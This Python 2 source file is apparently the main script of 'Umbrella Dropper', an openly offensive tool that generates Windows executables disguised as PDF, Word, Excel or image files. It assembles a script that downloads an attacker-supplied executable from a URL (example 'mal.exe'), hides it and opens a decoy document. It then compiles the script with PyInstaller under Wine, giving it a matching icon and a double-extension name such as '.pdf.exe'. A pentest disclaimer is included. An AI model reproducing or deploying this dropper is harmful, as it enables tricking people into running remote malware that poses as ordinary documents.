#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright 2017 Umbrella 
# Written by: * Alisson Moretto - 4w4k3
# https://github.com/4w4k3/Umbrella
# Licensed under the BSD-3-Clause
import os
import sys
import time
import random, string
from bin.settings import exec_com
from bin.settings import GREEN, WHITE, BLUE, RED,  END

def clear():
    os.system('clear')

def help():
    sys.stdout.write(GREEN + '''
    \n
    \n
    \n
    \n
            [UMBRELLA DROPPER] is a file dropper.''' + WHITE + '''
 To Use select an option from menu, You should know whats are doing.
                   Pentest is not to kidding !''' + BLUE + '''
    \n
    \n
    \n
    \nType [B] to return
    \n
''' + END)
def heading():
    clear()

    sys.stdout.write(GREEN + '''
                                   8
                        .,,aadd88P=8=Y88bbaa,,.
                  .,ad88888P:a8P:d888b:Y8a:Y88888ba,.
              ,ad888888P:a8888:a8888888a:8888a:Y888888ba,
           ,a8888888:d8888888:d888888888b:8888888b:8888888a,
        ,a88888888:d88888888:d88888888888b:88888888b:88888888a,
      ,d88888888:d888888888:d8888888888888b:888888888b:88888888b,
    ,d88888888:d8888888888I:888888888888888:I8888888888b:88888888b,
  ,d888888888:d88888888888:88888888888888888:88888888888b:888888888b,
 d8888888888:I888888888888:88888888888888888:888888888888I:8888888888b
d8P"'   `"Y8:8P"'     `"Y8:8P"'    8    `"Y8:8P"'     `"Y8:8P"'   `"Y8b
"           "             "        8        "             "           "
                                   8
                                   8  ''' + WHITE + '''    ![Umbrella Dropper]! v1.0''' + GREEN + '''
                                   8
        [''' + WHITE + 'D' + GREEN + '''] Gen Dropper            8     ''' + WHITE + 'by:' + GREEN + ''' Alisson Moretto (''' + WHITE + '4w4k3' + GREEN + ''')
        [''' + WHITE + 'H' + GREEN + '''] Help                   8           4w4k3@protonmail.com
        [''' + WHITE + 'U' + GREEN + '''] Update                 8             Tw: ''' + WHITE + '@4w4k3Official' + GREEN + '''
        [''' + WHITE + 'E' + GREEN + '''] Exit                   8
\n''' + END)
    print "Select an option from menu:\n"
    
########
def gen():
    sys.stdout.write(WHITE + '\n[' + GREEN + '1' + WHITE + ']' + GREEN + ' PDF DROPPER' + WHITE + ' - Drop executable, hide it and open your custom pdf.')
    sys.stdout.write(WHITE + '\n[' + GREEN + '2' + WHITE + ']' + GREEN + ' WORD DROPPER' + WHITE + ' - Drop executable, hide it and open your custom docx.')    
    sys.stdout.write(WHITE + '\n[' + GREEN + '3' + WHITE + ']' + GREEN + ' EXCEL DROPPER' + WHITE + ' - Drop executable, hide it and open your custom xlsx.')
    sys.stdout.write(WHITE + '\n[' + GREEN + '4' + WHITE + ']' + GREEN + ' IMAGE DROPPER' + WHITE + ' - Drop executable, hide it and open your custom jpg/png.\n' + END)
########
def pp():
    sys.stdout.write(GREEN + '''
    \n
    \n
    \n
    \n
          THANK YOU FOR USING [UMBRELLA DROPPER].''' + WHITE + '''
            https://github.com/4w4k3/Umbrella''' + BLUE + '''
                     @4w4k3Official
    \n
    \n
    \n
    \n
    \n
''' + END)
def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))

def begin():
    print '\n[!] Attemption put direct url! ex: http://192.168.1.2/mal.exe'
    print '\n[*] Remember to include the http or https.\n'
    url_d = raw_input('Insert url from your exe to drop: ')
    embed_d = raw_input('Insert url from file to embed: ')
    if 'pdf' in embed_d:
        nameph = randomword(10) + '.pdf'
    if 'docx' in embed_d:
        nameph = randomword(10) + '.docx'
    if 'xlsx' in embed_d:
        nameph = randomword(10) + '.xlsx'
    if 'jpg' in embed_d:
        nameph = randomword(10) + '.jpg'
    if 'png' in embed_d:
        nameph = randomword(10) + '.png'
    template = open('Templates/U_dRoP.py', 'r')
    o = template.read()

    payload = '#!/usr/bin/python\n'
    payload += '# -*- coding: iso-8859-15 -*-\n'
    payload += 'import os\n'
    payload += 'from sys import exit\n'
    payload += 'import random\n'
    payload += 'from urllib import urlretrieve\n'
    payload += 'from shutil import move\n'
    payload += 'url_d = ' + "'" + url_d + "'" + '\n'
    payload += 'embed_d = ' + "'" + embed_d + "'" + '\n'
    payload += 'nameph = ' + "'" + nameph + "'" + '\n'
    payload += str(o)

    with open('D.py', 'w') as f:
        f.write(payload)
        f.close()	
    template.close()

 
def disclaimer():
     clear()
     sys.stdout.write(WHITE + '''
     UMBRELLA DROPPER
---------------------------[''' + RED + '''DISCLAIMER''' + END + ''']--------------------------
"DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."''' + BLUE + '''\n \n Taken from LICENSE:''' + WHITE + ''' https://github.com/4w4k3/Umbrella/LICENSE \n''' + '''\n USE THIS TOOL ONLY FOR EDUCATIONAL OR WORK(PENTEST) !!!!!! ''' + '''\n \n * A noble spirit embiggens the smallest man *\n''' + END)
     raw_input('\n\n\n           [PRESS ENTER TO CONTINUE]')
    

def main():
    if not os.geteuid() == 0:
        sys.exit('Umbrella must be run as root')
    clear()
    path = '.OK'
    if os.path.isdir(path):
        pass
    else:
        dep = raw_input('[!] Dependencies not found, Do you want to install it? (y/n) : ')
        if dep.upper() == 'Y':
            exec_com('checker.py', sudo=True)
        else:
            sys.exit(0)
    clear()
    disclaimer()    
    heading()
    try:

        while True:

            header = ('\n{1} UMBRELLA {1} ~ {2}'.format(GREEN, WHITE, END))
            choice = raw_input(header)
            
            if choice.upper() == 'Q' or choice.upper() == 'QUIT':
		clear()
		pp()
                raise SystemExit
	    elif choice.upper() == 'E' or choice.upper() == 'EXIT':
		clear()
		pp()
                raise SystemExit
            elif choice.upper() == 'H':
                help()
            elif choice.upper() == 'D':
                gen()
	    elif choice.upper() == 'U':
                exec_com('updater.py', sudo=True)
            elif choice == '1':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/pdf.umbrella -i Icons/pdf.ico -F D.py')
                os.system('rm -Rf build D.spec D.py')
                name = 'Umbrella_Pdf_.pdf.exe'
                os.rename('dist/D.exe', 'dist/' + name)
                clear()
                print '{0}[*] Done! Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
                quit = raw_input('Do You want quit or back to main?(Q/B)')
                if quit.upper() == 'Q':
                    clear()
                    pp()
                    sys.exit(0)
                elif quit.upper() == 'B':
                    main()
            elif choice == '2':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.umbrella -i Icons/word.ico -F D.py')
                os.system('rm -Rf build D.spec D.py')
                name = 'Umbrella_Word_.docx.exe'
                os.rename('dist/D.exe', 'dist/' + name)
                clear()
                print '{0}[*] Done! Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
                quit = raw_input('Do You want quit or back to main?(Q/B)')
                if quit.upper() == 'Q':
                    clear()
                    pp()
                    sys.exit(0)
                elif quit.upper() == 'B':
                    main()
            elif choice == '3':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.umbrella -i Icons/excel.ico -F D.py')
                os.system('rm -Rf build D.spec D.py')
                name = 'Umbrella_Excel_.xlsx.exe'
                os.rename('dist/D.exe', 'dist/' + name)
                clear()
                print '{0}[*] Done! Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
                quit = raw_input('Do You want quit or back to main?(Q/B)')
                if quit.upper() == 'Q':
                    clear()
                    pp()
                    sys.exit(0)
                elif quit.upper() == 'B':
                    main()
            elif choice == '4':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -i Icons/img.ico -F D.py')
                os.system('rm -Rf build D.spec D.py')
                name = 'Umbrella_Img_.jpg.exe'
                os.rename('dist/D.exe', 'dist/' + name)
                clear()
                print '{0}[*] Done! Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
                quit = raw_input('Do You want quit or back to main?(Q/B)')
                if quit.upper() == 'Q':
                    clear()
                    pp()
                    sys.exit(0)
                elif quit.upper() == 'B':
                    main()
            elif choice.upper() == 'B':
                main()
            else:                   
		print '\n [!] Invalid Option \n'
                
 

    except KeyboardInterrupt:
	clear()
	pp()
        sys.exit(0)


if __name__ == '__main__':
    main()
